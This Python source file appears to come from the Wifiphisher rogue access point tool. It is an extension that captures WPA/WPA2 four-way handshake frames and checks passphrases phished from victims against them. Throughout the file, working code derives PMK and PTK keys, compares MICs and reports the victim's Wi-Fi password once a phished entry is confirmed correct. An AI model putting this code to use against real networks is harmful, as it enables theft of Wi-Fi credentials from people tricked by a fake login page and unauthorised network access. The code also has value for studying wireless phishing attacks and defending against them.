# pylint: skip-file
# FIXME Pylint complains about EAPOL.
"""
Extension that capture the four way handshake and
do the verification whether the password given by
-pK option is valid
"""

import binascii
import hashlib
import hmac
import logging
from collections import defaultdict, deque

import scapy.layers.dot11 as dot11
import wifiphisher.common.constants as constants
import wifiphisher.common.extensions as extensions
from pbkdf2 import PBKDF2
from scapy.all import rdpcap

logger = logging.getLogger(__name__)

# define the verification state
DONE, FAIL, NOT_YET = list(range(3))

# backward compatible for scapy EAPOL
try:
    EAPOL = dot11.EAPOL
except AttributeError:
    # incase scapy version >= 2.4.0
    import scapy.layers.eap as eap
    EAPOL = eap.EAPOL


def is_valid_handshake_capture(handshake_path):
    """
    Check if valid handshake capture is found
    :param handshake_path: file path of handshake
    :type handshake_path: str
    :return: None
    :rtype: None
    """
    pkts = rdpcap(handshake_path)
    eapols = []
    # get all the KEY type EAPOLs
    for pkt in pkts:
        # pkt is Dot11 and is not retried frame
        if pkt.haslayer(dot11.Dot11) and not pkt.FCfield & (1 << 3):
            # pkt is EAPOL and KEY type
            if pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3:
                eapols.append(pkt)

    num_of_frames = len(eapols)
    for index in range(num_of_frames):
        if num_of_frames - index > 3:
            ap_bssid = eapols[index].addr2
            # from AP to STA
            msg1 = eapols[index]
            # from STA to AP
            msg2 = eapols[index + 1]
            # from AP to STA
            msg3 = eapols[index + 2]
            # from STA to AP
            msg4 = eapols[index + 3]

            if msg1.addr2 == ap_bssid and\
                    msg3.addr2 == ap_bssid and\
                    msg2.addr1 == ap_bssid and\
                    msg4.addr1 == ap_bssid:
                logger.info("Get valid handshake frames")
                return True
        else:
            break
    logger.info("No valid handshake frames exists")
    return False


class Handshakeverify(object):
    """
    Handles four way handshake verification
    """

    def __init__(self, data):
        """
        Setup the class with all the given arguments.

        :param self: A Handshakeverify object.
        :param data: Shared data from main engine
        :type self: Handshakeverify
        :type data: dictionary
        :return: None
        :rtype: None
        """

        # store the fourway eapols to calculate
        self._eapols = deque()
        # list used as store to pcap file
        self._store_eapols = []
        self._data = data
        # check if the verification is done
        self._is_done = NOT_YET
        # check if the fourway handshake is captured
        self._is_captured = False
        # check if the capture given by user is processed
        self._is_first = True
        # channel map to frame list
        self._packets_to_send = defaultdict(list)
        # correct captured password
        self._correct_password = None

    @staticmethod
    def _prf512(key, const_a, const_b):
        """
        Calculate the PTK from the PMK
        :param key: PMK
        :param const_a: Constant defined in 802.11
        :param const_b: Constant define in 802.11
        :type key: str
        :type const_a: str
        :type const_b: str
        :return: PTK
        :rtype: str
        """

        blen = 64
        index = 0
        return_array = ''
        while index <= ((blen * 8 + 159) / 160):
            hmacsha1 = hmac.new(
                key, const_a + chr(0x00) + const_b + chr(index), hashlib.sha1)
            index += 1
            return_array = return_array + hmacsha1.digest()
        return return_array[:blen]

    def _verify_creds(self, passphrase):
        """
        Verify the passphrase given by users is corrected
        :param packet: A scapy.layers.RadioTap object
        :param passphrase: passphrase from phishinghttp
        :type self: Handshakeverify
        :type passphrase: str
        :return True if verifcation is done
        :rtype: bool
        ..note: Since scapy doesn't parse the EAPOL key data for us we need
        to index the field by ourself. It is possible that the frame
        is malformed so catch the IndexError to prevent this.
        """

        # Catch the IndexError to prevent the malformed frame problem
        try:
            essid = self._data.target_ap_essid
            # constant for calculating PTK of 80211
            ap_mac = binascii.a2b_hex(''.join(
                self._data.target_ap_bssid.split(":")))
            # extract the APNonce from MSG-1
            ap_nonce = self._eapols[0].load[13:45]
            # address one of the MSG-1 is client's MAC address
            client_mac = binascii.a2b_hex(''.join(
                self._eapols[0].addr1.split(":")))
            # extract the SNonce from MSG-2
            client_nonce = self._eapols[1].load[13:45]
            # constant for calculating PTK of 80211
            const_b = min(ap_mac, client_mac) + max(ap_mac, client_mac) +\
                min(ap_nonce, client_nonce) + max(ap_nonce, client_nonce)

            # calculate PMK first
            pmk = PBKDF2(passphrase, essid, 4096).read(32)
            ptk = self._prf512(pmk, constants.CONST_A, const_b)

            # get the key version to determine using HMAC_SHA1 or HMAC_MD5
            msg4 = self._eapols[3]
            key_version = 1 if ord(msg4.load[2]) & 7 else 0

            # start to construct the buffer for calculating the MIC
            msg4_data = format(msg4[EAPOL].version, '02x') +\
                format(msg4[EAPOL].type, '02x') +\
                format(msg4[EAPOL].len, '04x')
            msg4_data += binascii.b2a_hex(msg4.load)[:154]
            msg4_data += "00" * 18
            msg4_data = binascii.a2b_hex(msg4_data)

            # compare the MIC calculated with the MIC from air
            if key_version:
                # use SHA1 Hash
                msg4_mic_cal = hmac.new(ptk[0:16], msg4_data,
                                        hashlib.sha1).hexdigest()[:32]
            else:
                # use MD5 Hash
                msg4_mic_cal = hmac.new(ptk[0:16], msg4_data).hexdigest()[:32]

            msg4_mic_cmp = binascii.b2a_hex(msg4.load[-18:-2])
            if msg4_mic_cmp == msg4_mic_cal:
                self._correct_password = passphrase
                return DONE
            return FAIL
        except IndexError:
            return FAIL

    @staticmethod
    def is_valid_handshake_frame(packet):
        """
        Check if the Dot11 packet is a valid EAPOL KEY frame
        :param self: Handshakeverify object
        :param packet: A scapy.layers.RadioTap object
        :type self: Handshakeverify
        :type packet: scapy.layers.RadioTap
        :return True if this is an EAPOL KEY frame
        :rtype: bool
        """
        # pkt is Dot11 nad packet is not retried
        if packet.haslayer(dot11.Dot11) and not packet.FCfield & (1 << 3):
            # check it is key type eapol
            if packet.haslayer(EAPOL) and packet[EAPOL].type == 3:
                return True
        return False

    @extensions.register_backend_funcs
    def psk_verify(self, *list_data):
        """
        Backend method for verifing the the captured credentials
        :param self: Handshakeverify object
        :param list_data: list data from phishinghttp
        :type self: Handshakeverify
        :type list_data: list
        :return 'success' if the password correct else return 'fail'
        :rtype: string
        """

        # we may have collected the fourway handshake
        while len(self._eapols) > 3:

            ap_bssid = self._data.target_ap_bssid
            # from AP to STA
            msg1 = self._eapols[0]
            # from STA to AP
            msg2 = self._eapols[1]
            # from AP to STA
            msg3 = self._eapols[2]
            # from STA to AP
            msg4 = self._eapols[3]

            # if the following condition correct but the MIC is
            # not correct we can pop 2 EAPOLs in the list
            # AP -> STA and STA -> AP. We cannot pop 4 since the
            # next 2 frames may be the MSG1 and MSG2
            if msg1.addr2 == ap_bssid and\
                    msg3.addr2 == ap_bssid and\
                    msg2.addr1 == ap_bssid and\
                    msg4.addr1 == ap_bssid:
                self._is_done = self._verify_creds(list_data[0])
                self._is_captured = True
                pop_pkt = self._eapols.popleft()
                self._store_eapols.append(pop_pkt)

            # remove the head of the eapol
            if self._is_done == DONE:
                logger.info("PSK:%s is correct", list_data[0])
                return 'success'
            else:
                pop_pkt = self._eapols.popleft()
                self._store_eapols.append(pop_pkt)

        # restore the _eapols to do the next time verfication
        self._eapols = deque(self._store_eapols + list(self._eapols))
        # reset the _store_eapols
        self._store_eapols = []
        # if captured the handshake but not done return fail
        if self._is_captured:
            logger.info("PSK:%s is incorrect", list_data[0])
            return 'fail'
        return 'not-captured'

    def get_packet(self, packet):
        """
        Process the Dot11 packets and verifiy it is a valid
        eapol frames in a 80211 fourway handshake
        :param self: Handshakeverify object
        :param packet: A scapy.layers.RadioTap object
        :type self: Handshakeverify
        :type packet: scapy.layers.RadioTap
        :return: empty list
        :rtype: list
        ..note: In this extension we don't need to send the packets
        to the extension manager.
        """

        # append the capture of user first:
        if self._is_first and self._data.args.handshake_capture:
            pkts = rdpcap(self._data.args.handshake_capture)
            for pkt in pkts:
                if self.is_valid_handshake_frame(pkt):
                    self._eapols.append(pkt)
            self._is_first = False

        # check if verification is done
        if self._is_done != DONE:
            # append to list if this is the key frame
            if self.is_valid_handshake_frame(packet):
                self._eapols.append(packet)

        num_of_frames = len(self._eapols)
        for index in range(num_of_frames):
            if num_of_frames - index > 3 and index + 3 <= len(self._eapols):
                ap_bssid = self._data.target_ap_bssid
                # from AP to STA
                msg1 = self._eapols[index]
                # from STA to AP
                msg2 = self._eapols[index + 1]
                # from AP to STA
                msg3 = self._eapols[index + 2]
                # from STA to AP
                msg4 = self._eapols[index + 3]

                if msg1.addr2 == ap_bssid and\
                        msg3.addr2 == ap_bssid and\
                        msg2.addr1 == ap_bssid and\
                        msg4.addr1 == ap_bssid:
                    self._is_captured = True
            else:
                break

        return self._packets_to_send

    def send_output(self):
        """
        Send the output the extension manager
        :param self: A Handshakeverify object.
        :type self: Handshakeverify
        :return: A list with the password checking information
        :rtype: list
        """

        ret_info = []
        pw_str = "ESSID: {0}".format(self._data.target_ap_essid)

        # handshake has been captured but verify fail
        if self._is_captured and self._is_done == FAIL:
            ret_info = ["PSK Captured - " + pw_str + " NOT correct!"]
        # handshake has been captured and wait for victim to
        # type credentials
        elif self._is_captured and self._is_done == NOT_YET:
            ret_info = ["PSK Captured - " + pw_str + " Wait for credential"]
        # passphrase correct
        elif self._is_captured and self._is_done == DONE:
            ret_info = ["PSK Captured - " + pw_str + " correct: " + self._correct_password]
        else:
            ret_info = ["WAIT for HANDSHAKE"]
        return ret_info

    def send_channels(self):
        """
        Send channels to subscribe
        :param self: A Handshakeverify object.
        :type self: Handshakeverify
        :return: empty list
        :rtype: list
        ..note: we don't need to send frames in this extension
        """

        return []

    def on_exit(self):
        """
        Free all the resources regarding to this module
        :param self: A Handshakeverify object.
        :type self: Handshakeverify
        :return: None
        :rtype: None
        """
        pass
